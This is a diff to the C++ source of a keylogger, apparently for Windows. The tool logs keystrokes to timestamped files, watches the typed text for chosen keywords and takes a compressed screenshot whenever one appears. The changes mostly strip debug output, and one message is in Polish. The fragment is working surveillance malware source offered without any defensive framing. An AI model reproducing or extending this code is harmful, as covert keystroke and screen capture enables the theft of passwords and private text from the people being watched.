@@ -206,7 +206,8 @@ void Keylogger::get_key(std::ofstream &file_logs)
 				key = intToString(c);
 
 #ifdef DEBUG
-			printf("Key = %s (%d)\n", key.c_str(), c);
+			/*printf("Key = %s (%d)\n", key.c_str(), c);*/
+			printf("%s (%d) ", key.c_str(), c);
 #endif
 			look_for_keyword(all_keys);
 
@@ -219,20 +220,19 @@ void Keylogger::look_for_keyword(std::string &_all_keys)
 {
 	size_t position_of_key;
 
+	// Search through all keywords to see if the user has typed something particular
 	for (const std::string &key : keywords)
 	{	
-		std::cout << "Looking for: " << key << "\n";
+		//std::cout << "Content of all keys that were pressed: " << _all_keys << "\n";
 		position_of_key = _all_keys.find(key);
-		std::cout << "Content of all keys that were pressed: " << _all_keys << "\n";
+
 		if (position_of_key != std::string::npos)
 		{
 			// Save a screenshot with the name of a keyword
 			Screenshot screenshotter;
 			screenshotter.take_screenshot("_KLUCZ=" + key);			
 			screenshotter.compress_image();
-			
-			std::cout << "KEY Screenshot taken!\n Key found: " << key << "\n";
-			
+						
 			// Remove the key from string so that there are no double (and more) false positives.
 			_all_keys.erase(position_of_key, key.size());
 		}
@@ -258,9 +258,7 @@ std::string Keylogger::create_file()
 	strftime(file_name, 100, "%Y-%m-%d_%H-%M-%S", &timeinfo);
 	sprintf_s(file_path, MAX_PATH, "%s\\%s%s", basepath.c_str(), file_name, FILEEXT);
 
-#ifdef DEBUG
-	printf("Saving content to: filepath '%s'\n", file_path);
-#endif // DEBUG
+	printf("Logi sa zapisywane do: '%s'\n", file_path);
 
 	m_file_path = std::string(file_path);
 	
@@ -279,7 +277,8 @@ std::ofstream& Keylogger::get_file_logs_clean_keys()
 	return file_logs_clean_keys;
 }
 
-/* User can choose keywords - once they are typed the application will make the screenshot at this time.*/
+/* User can choose keywords - once they are typed the application will make the screenshot
+ * at the time they are typed again. */
 std::vector<std::string> get_keywords()
 {
 	std::string keyword;
@@ -291,7 +290,6 @@ std::vector<std::string> get_keywords()
 
 	while (strings_split >> keyword)
 	{
-		std::cout << "Keyword: " << keyword << "\n";
 		keywords.push_back(keyword);
 	}
 
